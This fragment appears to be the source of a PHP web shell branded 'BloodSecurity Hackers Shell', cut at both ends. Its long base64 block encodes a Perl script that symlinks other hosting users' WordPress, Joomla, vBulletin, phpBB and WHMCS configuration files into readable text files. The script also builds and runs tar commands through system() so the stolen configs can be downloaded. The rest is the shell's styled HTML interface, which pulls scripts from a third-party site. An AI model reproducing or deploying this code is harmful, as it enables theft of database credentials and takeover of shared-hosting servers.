GluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywka29sYS4nfn40LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRrb2xhLid+fmludmlzaW8udHh0Jyk7DQpzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywka29sYS4nfn43LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25uZWN0LnBocCcsJGtvbGEuJ35+OC50eHQnKTsNCnN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvbWtfY29uZi5waHAnLCRrb2xhLid+fm1rLXBvcnRhbGUxLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2NvbmZpZy5waHAnLCRrb2xhLid+fjEyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zZXR0aW5ncy5waHAnLCRrb2xhLid+flNtZi50eHQnKTsNCnN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZnVuY3Rpb25zLnBocCcsJGtvbGEuJ35+cGhwYmIzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2RiLnBocCcsJGtvbGEuJ35+aW5maW5pdHkudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLid+fnZCdWxsZXRpbjEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLid+fnZCdWxsZXRpbjIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLid+fnZCdWxsZXRpbjMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NjL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLid+fnZCdWxsZXRpbjQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRrb2xhLid+flBocGJiMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJ35+UGhwYmIyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywka29sYS4nfn5Xb3JkcHJlc3MxLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRrb2xhLid+fldvcmRwcmVzczIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5Kb29tbGExLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5Kb29tbGEyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fkpvb21sYTMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htYy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htMy50eHQnKTsNCnN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG00LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htNS50eHQnKTsNCnN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htNi50eHQnKTsNCnN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htNy50eHQnKTsNCnN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTgudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG05LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCcsJGtvbGEuJ35+NS50eHQnKTsNCnN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsJGtvbGEuJ35+NC50eHQnKTsNCnN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwJywka29sYS4nfn5pbnZpc2lvLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU1LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2RiLnBocCcsJGtvbGEuJ35+Ny50eHQnKTsNCnN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29ubmVjdC5waHAnLCRrb2xhLid+fjgudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywka29sYS4nfn5tay1wb3J0YWxlMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZS9jb25maWcucGhwJywka29sYS4nfn4xMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2V0dGluZ3MucGhwJywka29sYS4nfn5TbWYudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRrb2xhLid+fnBocGJiMy50eHQnKTsNCnN5bWxpbmsoJy9ob21lNS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZS9kYi5waHAnLCRrb2xhLid+fmluZmluaXR5LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC92Yi9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn52QnVsbGV0aW4xLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn52QnVsbGV0aW4yLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn52QnVsbGV0aW4zLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jYy9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn52QnVsbGV0aW40LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywka29sYS4nfn5QaHBiYjEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLid+flBocGJiMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGtvbGEuJ35+V29yZHByZXNzMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywka29sYS4nfn5Xb3JkcHJlc3MyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+Sm9vbWxhMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+Sm9vbWxhMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5Kb29tbGEzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htNC50eHQnKTsNCnN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTUudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTYudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTcudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG04LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vcmRlci9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htOS50eHQnKTsNCnN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRrb2xhLid+fjUudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRrb2xhLid+fjQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGtvbGEuJ35+aW52aXNpby50eHQnKTsNCnN5bWxpbmsoJy9ob21lNi8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZS9kYi5waHAnLCRrb2xhLid+fjcudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2Nvbm5lY3QucGhwJywka29sYS4nfn44LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJGtvbGEuJ35+bWstcG9ydGFsZTEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvY29uZmlnLnBocCcsJGtvbGEuJ35+MTIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL3NldHRpbmdzLnBocCcsJGtvbGEuJ35+U21mLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU2LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9mdW5jdGlvbnMucGhwJywka29sYS4nfn5waHBiYjMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywka29sYS4nfn5pbmZpbml0eS50eHQnKTsNCnN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJ35+dkJ1bGxldGluMS50eHQnKTsNCnN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJ35+dkJ1bGxldGluMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJ35+dkJ1bGxldGluMy50eHQnKTsNCnN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY2MvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJ35+dkJ1bGxldGluNC50eHQnKTsNCnN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLnBocCcsJGtvbGEuJ35+UGhwYmIxLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn5QaHBiYjIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRrb2xhLid+fldvcmRwcmVzczEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGtvbGEuJ35+V29yZHByZXNzMi50eHQnKTsNCnN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fkpvb21sYTEudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fkpvb21sYTIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+Sm9vbWxhMy50eHQnKTsNCnN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG0xLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG0yLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG0zLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTQudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG01LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG02LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG03LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htOC50eHQnKTsNCnN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvb3JkZXIvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTkudHh0Jyk7DQpzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmYucGhwJywka29sYS4nfn41LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywka29sYS4nfn40LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRrb2xhLid+fmludmlzaW8udHh0Jyk7DQpzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywka29sYS4nfn43LnR4dCcpOw0Kc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25uZWN0LnBocCcsJGtvbGEuJ35+OC50eHQnKTsNCnN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbWtfY29uZi5waHAnLCRrb2xhLid+fm1rLXBvcnRhbGUxLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2NvbmZpZy5waHAnLCRrb2xhLid+fjEyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zZXR0aW5ncy5waHAnLCRrb2xhLid+flNtZi50eHQnKTsNCnN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZnVuY3Rpb25zLnBocCcsJGtvbGEuJ35+cGhwYmIzLnR4dCcpOw0Kc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2RiLnBocCcsJGtvbGEuJ35+aW5maW5pdHkudHh0Jyk7DQp9DQppZiAoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAnUE9TVCcpIHsNCiAgcmVhZChTVERJTiwgJGJ1ZmZlciwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQp9IGVsc2Ugew0KICAkYnVmZmVyID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQp9DQpAcGFpcnMgPSBzcGxpdCgvJi8sICRidWZmZXIpOw0KZm9yZWFjaCAkcGFpciAoQHBhaXJzKSB7DQogICgkbmFtZSwgJHZhbHVlKSA9IHNwbGl0KC89LywgJHBhaXIpOw0KICAkbmFtZSA9fiB0ci8rLyAvOw0KICAkbmFtZSA9fiBzLyUoW2EtZkEtRjAtOV1bYS1mQS1GMC05XSkvcGFjaygiQyIsIGhleCgkMSkpL2VnOw0KICAkdmFsdWUgPX4gdHIvKy8gLzsNCiAgJHZhbHVlID1+IHMvJShbYS1mQS1GMC05XVthLWZBLUYwLTldKS9wYWNrKCJDIiwgaGV4KCQxKSkvZWc7DQogICRGT1JNeyRuYW1lfSA9ICR2YWx1ZTsNCn0NCmlmICgkRk9STXtwYXNzfSBlcSAiIil7DQpwcmludCAnDQo8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIiBiZ2NvbG9yPSIjMDAwMDAwIj4NCjxwPlBhaW4gU2NyaXB0IFRvIFN5bWxpbmsgQ29uZmlnczwvcD48L2E+IA0KPGZvcm0gbWV0aG9kPSJwb3N0Ij4NCjx0ZXh0YXJlYSBuYW1lPSJwYXNzIiBzdHlsZT0iYm9yZGVyOjFweCBkb3R0ZWQgIzAwRkZGRjsgd2lkdGg6IDU0M3B4OyBoZWlnaHQ6IDQyMHB4OyBiYWNrZ3JvdW5kLWNvbG9yOiMwQzBDMEM7IGZvbnQtZmFtaWx5OlRhaG9tYTsgZm9udC1zaXplOjhwdDsgY29sb3I6IzAwRkZGRiIgID48L3RleHRhcmVhPjxiciAvPg0KJm5ic3A7PHA+DQo8aW5wdXQgbmFtZT0idGFyIiB0eXBlPSJ0ZXh0IiBzdHlsZT0iYm9yZGVyOjFweCBkb3R0ZWQgIzAwRkZGRjsgd2lkdGg6IDIxMnB4OyBiYWNrZ3JvdW5kLWNvbG9yOiMwQzBDMEM7IGZvbnQtZmFtaWx5OlRhaG9tYTsgZm9udC1zaXplOjhwdDsgY29sb3I6IzAwRkZGRjsgIiAgLz48YnIgLz4NCiZuYnNwOzwvcD4NCjxwPg0KPGlucHV0IG5hbWU9IlN1Ym1pdDEiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdldCBDb25maWciIHN0eWxlPSJib3JkZXI6MXB4IGRvdHRlZCAjMDBGRkZGOyB3aWR0aDogOTk7IGZvbnQtZmFtaWx5OlRhaG9tYTsgZm9udC1zaXplOjEwcHQ7IGNvbG9yOiMwMEZGRkY7IHRleHQtdHJhbnNmb3JtOnVwcGVyY2FzZTsgaGVpZ2h0OjIzOyBiYWNrZ3JvdW5kLWNvbG9yOiMwQzBDMEMiIC8+PC9wPg0KPC9mb3JtPic7DQp9ZWxzZXsNCkBsaW5lcyA9PCRGT1JNe3Bhc3N9PjsNCiR5ID0gQGxpbmVzOw0Kb3BlbiAoTVlGSUxFLCAiPnRhci50bXAiKTsNCnByaW50IE1ZRklMRSAidGFyIC1jemYgIi4kRk9STXt0YXJ9LiIudGFyICI7DQpmb3IgKCRrYT0wOyRrYTwkeTska2ErKyl7DQp3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiZsaWwoJDEpOw0KcHJpbnQgTVlGSUxFICQxLiIudHh0ICI7DQpmb3IoJGtkPTE7JGtkPDE4OyRrZCsrKXsNCnByaW50IE1ZRklMRSAkMS4ka2QuIi50eHQgIjsNCn0NCn0NCiB9DQpwcmludCc8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIiBiZ2NvbG9yPSIjMDAwMDAwIj4NCjxwPkRvbmUgISE8L3A+DQo8cD4mbmJzcDs8L3A+JzsNCmlmKCRGT1JNe3Rhcn0gbmUgIiIpew0Kb3BlbihJTkZPLCAidGFyLnRtcCIpOw0KQGxpbmVzID08SU5GTz4gOw0KY2xvc2UoSU5GTyk7DQpzeXN0ZW0oQGxpbmVzKTsNCnByaW50JzxwPjxhIGhyZWY9IicuJEZPUk17dGFyfS4nLnRhciI+PGZvbnQgY29sb3I9IiMwMEZGMDAiPg0KPHNwYW4gc3R5bGU9InRleHQtZGVjb3JhdGlvbjogbm9uZSI+Q2xpY2sgSGVyZSBUbyBEb3dubG9hZCBUYXIgRmlsZTwvc3Bhbj48L2ZvbnQ+PC9hPjwvcD4nOw0KfQ0KfQ0KIHByaW50Ig0KPC9ib2R5Pg0KPC9odG1sPiI7';
?>
<html><head>
<html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title><?php echo str_replace('.', '', 'BloodSecurity Hackers Shell'); ?></title>
	<link href='http://fonts.googleapis.com/css?family=Abel' rel='stylesheet' type='text/css'>
	
	 <link rel="stylesheet" href="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/layout/css/reset.css" type="text/css"/> 
 <link rel="stylesheet" href="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css">
 
 <link href='http://fonts.googleapis.com/css?family=Orbitron:400,900' rel='stylesheet' type='text/css'>
 <link rel="stylesheet" href="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/layout/css/custom.css" type="text/css"/>
 <script src="countdown.js" type="text/javascript"></script> 
 <script type="text/javascript" src="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/code.jquery.com/jquery-latest.js"></script>
 <script type="text/javascript">
		url="index.html";
		main_url="index.html";
	</script>
	
   <style type='text/css'>body, a, a:link{cursor:url(http://cur.cursors-4u.net/cursors/cur-2/cur117.cur), default;} a:hover {cursor:url(http://cur.cursors-4u.net/cursors/cur-2/cur116.cur),wait;}</style>
    </style>
    <style type="text/css">
    body,td{font: 10pt Tahoma;color:gray;line-height: 16px;}
     
    a {color:red;text-decoration:none;}
    a:hover{color: #f00;text-decoration:none;}
    .alt1 td{border-top:1px solid gray;border-bottom:1px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
    .alt2 td{border-top:1px solid gray;border-bottom:1px solid gray;background:#f9f9f9;padding:5px 10px 5px 5px;}
    .focus td{border-top:1px solid gray;border-bottom:0px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
    .fout1 td{border-top:1px solid gray;border-bottom:0px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
    .fout td{border-top:1px solid gray;border-bottom:0px solid gray;background:#202020;padding:5px 10px 5px 5px;}
    .head td{border-top:1px solid gray;border-bottom:1px solid gray;background:#202020;padding:5px 10px 5px 5px;font-weight:bold;}
    .head_small td{border-top:1px solid gray;border-bottom:1px solid gray;background:#202020;padding:5px 10px 5px 5px;font-weight:normal;font-size:8pt;}
    .head td span{font-weight:normal;}
    form{margin:0;padding:0;}
    h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
    ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
    u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
    input, textarea, button
    {
            font-size: 9pt;
            color: #ccc;
            font-family: verdana, sans-serif;
            background-color: #202020;
            border-left: 1px solid red;
            border-top: 1px solid red;
            border-right: 1px solid red;
            border-bottom: 1px solid red;
			text-decoration:none;
    }
    select
    {
            font-size: 8pt;
            font-weight: normal;
            color: #ccc;
            font-family: verdana, sans-serif;
            background-color: #202020;
    }
     
    </style>
    <script type="text/javascript">
    function CheckAll(form) {
            for(var i=0;i<form.elements.length;i++) {
                    var e = form.elements[i];
                    if (e.name != 'chkall')
                    e.checked = form.chkall.checked;
        }
    }
    function $(id) {
            return document.getElementById(id);
    }
    function goaction(act){
            $('goaction').action.value=act;
            $('goaction').submit();
    }
    </script>
    </head>
    <body onLoad="init()" style="margin:0;table-layout:fixed; word-break:break-all" bgcolor=black background=http://i382.photobucket.com/albums/oo263/vnhacker/bg-1.jpg>
     
     
    <div border="0" style="position:fixed; width: 100%; height: 25px; z-index: 1; top: 300px; left: 0;" id="loading" align="center" valign="center">
                                    <table border="1" width="110px" cellspacing="0" cellpadding="0" style="border-collapse: collapse" bordercolor="#990066">
                                            <tr>
                                                    <td align="center" valign=center>
                                     <div border="1" style="background-color: #0E0E0E; filter: alpha(opacity=70); opacity: .7; width: 110px; height: 25px; z-index: 1; border-collapse: collapse;" bordercolor="#006600"  align="center">
                                       Loading<img src="http://i382.photobucket.com/albums/oo263/vnhacker/loading.gif">
                                      </div>
                                    </td>
                                            </tr>
                                    </table>
                             </div>
     <script>
     var ld=(document.all);
      var ns4=document.layers;
     var ns6=document.getElementById&&!document.all;
     var ie4=document.all;
      if (ns4)
            ld=document.loading;
     else if (ns6)
            ld=document.getElementById("loading").style;
     else if (ie4)
            ld=document.all.loading.style;
      function init()
     {
     if(ns4){ld.visibility="hidden";}
     else if (ns6||ie4) ld.display="none";
     }
     </script>

<script type="text/javascript">
<!-- 
